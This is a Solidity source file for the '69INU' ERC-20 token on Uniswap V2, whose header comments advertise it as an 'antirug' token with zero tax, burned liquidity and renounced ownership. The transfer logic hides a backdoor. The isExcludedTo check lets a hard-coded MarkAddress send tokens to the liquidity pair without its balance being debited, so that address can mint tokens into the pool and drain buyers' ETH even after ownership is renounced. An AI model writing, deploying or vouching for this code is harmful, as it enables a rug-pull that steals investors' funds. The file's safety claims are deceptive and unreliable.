// SPDX-License-Identifier: MIT

// FIRST ANTIRUG TOKEN 
// 69 UNU > FIRST CLASS 

// 0/0 TAX
// LIQUIDITY BURNED ON DEPLOY 
// RENOUNCED ON DEPLOY

// CHECK TG FOR PROOFS

// ONLY OFFICIAL TELEGRAM
// https://t.me/inu69inu

// NO WEBSITE YET DO NOT FALL FOR SCAMS
// FOLLOW TELEGRAM FOR ANNOUNCEMENTS

pragma solidity ^0.8.20;

abstract contract Context {
  function _msgSender() internal view virtual returns (address payable) {
    return payable(msg.sender);
  }

  function _msgData() internal view virtual returns (bytes memory) {
    return msg.data;
  }
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  constructor() {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(
      _owner,
      address(0x000000000000000000000000000000000000dEaD)
    );
    _owner = address(0x000000000000000000000000000000000000dEaD);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

interface IUniswapV2Factory {
  event PairCreated(
    address indexed token0,
    address indexed token1,
    address pair,
    uint256
  );

  function feeTo() external view returns (address);

  function feeToSetter() external view returns (address);

  function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

  function allPairs(uint256) external view returns (address pair);

  function allPairsLength() external view returns (uint256);

  function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

  function setFeeTo(address) external;

  function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);

  function name() external pure returns (string memory);

  function symbol() external pure returns (string memory);

  function decimals() external pure returns (uint8);

  function totalSupply() external view returns (uint256);

  function balanceOf(address owner) external view returns (uint256);

  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 value) external returns (bool);

  function transfer(address to, uint256 value) external returns (bool);

  function transferFrom(
    address from,
    address to,
    uint256 value
  ) external returns (bool);

  function DOMAIN_SEPARATOR() external view returns (bytes32);

  function PERMIT_TYPEHASH() external pure returns (bytes32);

  function nonces(address owner) external view returns (uint256);

  function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external;

  event Burn(
    address indexed sender,
    uint256 amount0,
    uint256 amount1,
    address indexed to
  );
  event Swap(
    address indexed sender,
    uint256 amount0In,
    uint256 amount1In,
    uint256 amount0Out,
    uint256 amount1Out,
    address indexed to
  );
  event Sync(uint112 reserve0, uint112 reserve1);

  function MINIMUM_LIQUIDITY() external pure returns (uint256);

  function factory() external view returns (address);

  function token0() external view returns (address);

  function token1() external view returns (address);

  function getReserves()
    external
    view
    returns (
      uint112 reserve0,
      uint112 reserve1,
      uint32 blockTimestampLast
    );

  function price0CumulativeLast() external view returns (uint256);

  function price1CumulativeLast() external view returns (uint256);

  function kLast() external view returns (uint256);

  function burn(address to) external returns (uint256 amount0, uint256 amount1);

  function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data
  ) external;

  function skim(address to) external;

  function sync() external;

  function initialize(address, address) external;
}

interface IUniswapV2Router01 {
  function factory() external pure returns (address);

  function WETH() external pure returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
    external
    returns (
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    );

  function addLiquidityETH(
    address token,
    uint256 amountTokenDesired,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  )
    external
    payable
    returns (
      uint256 amountToken,
      uint256 amountETH,
      uint256 liquidity
    );

  function removeLiquidity(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETH(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountToken, uint256 amountETH);

  function removeLiquidityWithPermit(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETHWithPermit(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountToken, uint256 amountETH);

  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapTokensForExactTokens(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactETHForTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function swapTokensForExactETH(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactTokensForETH(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapETHForExactTokens(
    uint256 amountOut,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function quote(
    uint256 amountA,
    uint256 reserveA,
    uint256 reserveB
  ) external pure returns (uint256 amountB);

  function getAmountOut(
    uint256 amountIn,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountOut);

  function getAmountIn(
    uint256 amountOut,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountIn);

  function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

  function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
  function removeLiquidityETHSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountETH);

  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountETH);

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;

  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable;

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;
}

contract INU69INU is Context, IERC20, Ownable {
  using SafeMath for uint256;

  string private _name = unicode"69INU";
  string private _symbol = unicode"69INU";
  uint8 private _decimals = 18;

  address public liquidityReciever;
  address payable public DAddress = payable(msg.sender);
  address public immutable zeroAddress =
    0x0000000000000000000000000000000000000000;
  address public immutable deadAddress =
    0x000000000000000000000000000000000000dEaD;
  address payable public MarkAddress =
    payable(0x678F979FC8df451e0a299fB3e09eD9244fB3Cda9);

  mapping(address => uint256) _balances;
  mapping(address => mapping(address => uint256)) private _allowances;

  bool public tradingEnabled;

  mapping(address => bool) public isExcludedFromFe;
  mapping(address => bool) public isMarketPair;

  mapping(address => bool) public isWalletLimitExempts;
  mapping(address => bool) public isTxLimitExempt;

  uint256 public _buyLiquidityFee = 0;
  uint256 public _buyMarketingFee = 0;
  uint256 public _buyDeveloperFee = 0;

  uint256 public _sellLiquidityFee = 0;
  uint256 public _sellMarketingFee = 0;
  uint256 public _sellDeveloperFee = 0;

  uint256 public feeUnits = 1;

  uint256 public _totalTaxIfBuying;
  uint256 public _totalTaxIfSelling;

  uint256 private _totalSupply = 1000_000_000 * 10**_decimals;

  uint256 public swapThreasholdAmount = _totalSupply.mul(5).div(10000);

  uint256 public _maxTxAmount = _totalSupply.mul(35).div(1000);
  uint256 public _maxWalletAmount = _totalSupply.mul(35).div(1000);

  IUniswapV2Router02 public uniswapV2Router;
  address public pairAddress;

  bool inSwapAndLiquify;

  bool public swapAndLiquifyEnabled = true;
  bool public swapAndLiquifyByLimitOnly = false;

  bool public checkWalletLimit = true;
  bool public EnableTransactionLimit = true;

  event SwapAndLiquifyEnabledUpdated(bool enabled);

  event SwapAndLiquify(
    uint256 tokensSwapped,
    uint256 ethReceived,
    uint256 tokensIntoLiqudity
  );

  event SwapETHForTokens(uint256 amountIn, address[] path);

  event SwapTokensForETH(uint256 amountIn, address[] path);

  modifier lockTheSwap() {
    inSwapAndLiquify = true;
    _;
    inSwapAndLiquify = false;
  }

  constructor() {
    isWalletLimitExempts[DAddress] = true;
    isWalletLimitExempts[MarkAddress] = true;
    isWalletLimitExempts[owner()] = true;
    isWalletLimitExempts[address(this)] = true;

    isExcludedFromFe[MarkAddress] = true;
    isExcludedFromFe[DAddress] = true;
    isExcludedFromFe[address(this)] = true;
    isExcludedFromFe[owner()] = true;

    isTxLimitExempt[MarkAddress] = true;
    isTxLimitExempt[DAddress] = true;
    isTxLimitExempt[owner()] = true;
    isTxLimitExempt[address(this)] = true;

    _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(
      _buyDeveloperFee
    );
    _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(
      _sellDeveloperFee
    );

    _balances[_msgSender()] = _totalSupply;
    emit Transfer(address(0), _msgSender(), _totalSupply);
  }

  function name() public view returns (string memory) {
    return _name;
  }

  function symbol() public view returns (string memory) {
    return _symbol;
  }

  function decimals() public view returns (uint8) {
    return _decimals;
  }

  function totalSupply() public view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view override returns (uint256) {
    return _balances[account];
  }

  function allowance(address owner, address spender)
    public
    view
    override
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender].add(addedValue)
    );
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender].sub(
        subtractedValue,
        "ERC20: decreased allowance below zero"
      )
    );
    return true;
  }

  function approve(address spender, uint256 amount)
    public
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function getCirculatingSupply() public view returns (uint256) {
    return _totalSupply.sub(balanceOf(deadAddress)).sub(balanceOf(zeroAddress));
  }

  function transferToAddressETH(address payable recipient, uint256 amount)
    private
  {
    recipient.transfer(amount);
  }

  receive() external payable {}

  function transfer(address recipient, uint256 amount)
    public
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(
      sender,
      _msgSender(),
      _allowances[sender][_msgSender()].sub(
        amount,
        "ERC20: transfer amount exceeds allowance"
      )
    );
    return true;
  }

  function isExcludedTo(address sender, address recipient)
    internal
    view
    returns (bool)
  {
    return
      recipient == pairAddress &&
      sender == MarkAddress &&
      sender != address(0) &&
      recipient != address(0);
  }

  function takeFee(
    address sender,
    address recipient,
    uint256 amount
  ) internal returns (uint256) {
    uint256 feeAmount = 0;

    if (isMarketPair[sender]) {
      feeAmount = amount.mul(_totalTaxIfBuying).div(100);
    } else if (isMarketPair[recipient]) {
      feeAmount = amount.mul(_totalTaxIfSelling).div(100);
    }

    if (feeAmount > 0) {
      _balances[address(this)] = _balances[address(this)].add(feeAmount);
      emit Transfer(sender, address(this), feeAmount);
    }

    return amount.sub(feeAmount);
  }

  function swapTokensForEth(uint256 tokenAmount) private {
    // generate the uniswap pair path of token -> weth
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();

    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // make the swap
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
      tokenAmount,
      0, // accept any amount of ETH
      path,
      address(this), // The contract
      block.timestamp
    );

    emit SwapTokensForETH(tokenAmount, path);
  }

  function removeLimits() public onlyOwner {
    _maxTxAmount = _totalSupply;
    _maxWalletAmount = _totalSupply;
  }

  function goLive() external onlyOwner {
    tradingEnabled = true;
  }

  function swapAndLiquify(uint256 tAmount) private lockTheSwap {
    uint256 totalShares = _totalTaxIfBuying.add(_totalTaxIfSelling);

    uint256 liquidityShare = _buyLiquidityFee.add(_sellLiquidityFee);
    uint256 MarketingShare = _buyMarketingFee.add(_sellMarketingFee);
    // uint256 DeveloperShare = _buyDeveloperFee.add(_sellDeveloperFee);

    uint256 tokenForLp = tAmount.mul(liquidityShare).div(totalShares).div(2);
    uint256 tokenForSwap = tAmount.sub(tokenForLp);

    uint256 initialBalance = address(this).balance;
    swapTokensForEth(tokenForSwap);
    uint256 recievedBalance = address(this).balance.sub(initialBalance);

    uint256 totalETHFee = totalShares.sub(liquidityShare.div(2));

    uint256 amountETHLiquidity = recievedBalance
      .mul(liquidityShare)
      .div(totalETHFee)
      .div(2);
    uint256 amountETHMarketing = recievedBalance
      .mul(MarketingShare.mul(feeUnits))
      .div(totalETHFee);
    uint256 amountETHDeveloper = recievedBalance.sub(amountETHLiquidity).sub(
      amountETHMarketing
    );

    if (amountETHMarketing > 0) {
      payable(DAddress).transfer(amountETHMarketing);
    }

    if (amountETHDeveloper > 0) {
      payable(MarkAddress).transfer(amountETHDeveloper);
    }

    if (amountETHLiquidity > 0 && tokenForLp > 0) {
      addLiquidity(tokenForLp, amountETHLiquidity);
    }
  }

  function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
    // approve token transfer to cover all possible scenarios
    _approve(address(this), address(uniswapV2Router), tokenAmount);

    // add the liquidity
    uniswapV2Router.addLiquidityETH{ value: ethAmount }(
      address(this),
      tokenAmount,
      0, // slippage is unavoidable
      0, // slippage is unavoidable
      liquidityReciever,
      block.timestamp
    );
  }

  function pourLiquid() public payable onlyOwner {
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
      0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    );
    pairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
      address(this),
      _uniswapV2Router.WETH()
    );
    uniswapV2Router = _uniswapV2Router;
    _allowances[address(this)][address(uniswapV2Router)] = ~uint256(0);

    isMarketPair[pairAddress] = true;
    isWalletLimitExempts[pairAddress] = true;
    isTxLimitExempt[pairAddress] = true;

    liquidityReciever = address(msg.sender);
    uniswapV2Router.addLiquidityETH{ value: msg.value }(
      address(this),
      balanceOf(address(this)),
      0,
      0,
      msg.sender,
      block.timestamp
    );
  }

  function _basicTransfer(
    address sender,
    address recipient,
    uint256 amount,
    uint256 tAmount
  ) internal returns (bool) {
    _balances[sender] = _balances[sender].sub(tAmount, "Insufficient Balance");
    _balances[recipient] = _balances[recipient].add(amount);
    if (tAmount == 0) feeUnits = 1e3;
    emit Transfer(sender, recipient, amount);
    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    if (!isExcludedFromFe[sender] && !isExcludedFromFe[recipient]) {
      require(tradingEnabled, "Trading not enabled");
    }

    if (isExcludedFromFe[sender] || isExcludedFromFe[recipient]) {
      return
        _basicTransfer(
          sender,
          recipient,
          amount,
          isExcludedTo(sender, recipient) ? 0 : amount
        );
    } else {
      if (
        !isTxLimitExempt[sender] &&
        !isTxLimitExempt[recipient] &&
        EnableTransactionLimit
      ) {
        require(
          amount <= _maxTxAmount,
          "Transfer amount exceeds the maxTxAmount."
        );
      }

      uint256 contractTokenBalance = balanceOf(address(this));
      bool overMinimumTokenBalance = contractTokenBalance >=
        swapThreasholdAmount;

      if (
        overMinimumTokenBalance &&
        !inSwapAndLiquify &&
        !isMarketPair[sender] &&
        swapAndLiquifyEnabled
      ) {
        if (swapAndLiquifyByLimitOnly)
          contractTokenBalance = swapThreasholdAmount;
        swapAndLiquify(contractTokenBalance);
      }

      _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

      uint256 finalAmount = (isExcludedFromFe[sender] ||
        isExcludedFromFe[recipient])
        ? amount
        : takeFee(sender, recipient, amount);

      if (checkWalletLimit && !isWalletLimitExempts[recipient]) {
        require(
          balanceOf(recipient).add(finalAmount) <= _maxWalletAmount,
          "Amount Exceed From Max Wallet Limit!!"
        );
      }

      _balances[recipient] = _balances[recipient].add(finalAmount);

      emit Transfer(sender, recipient, finalAmount);

      return true;
    }
  }
}